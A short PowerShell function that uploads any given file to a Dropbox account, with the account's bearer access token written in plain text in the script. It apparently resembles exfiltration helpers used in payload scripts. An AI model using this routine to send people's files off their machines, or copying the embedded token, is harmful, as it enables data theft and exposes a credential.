function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$dbb = "sl.BstyyLu6R4kvXImPfLoUeAsbr7JclaqRmFPeeN3pxE2Bks0GKKoc8jjZRcTXIt2QGmwZxc7nTGfzmIhrPN6BdgtIgj0ysOfRooSxSTMY8l4725jNOAAga5oh3JZoE_qc-b1UCJSBmmDY2xM"
$dba = "$dbb"
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $dba
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}
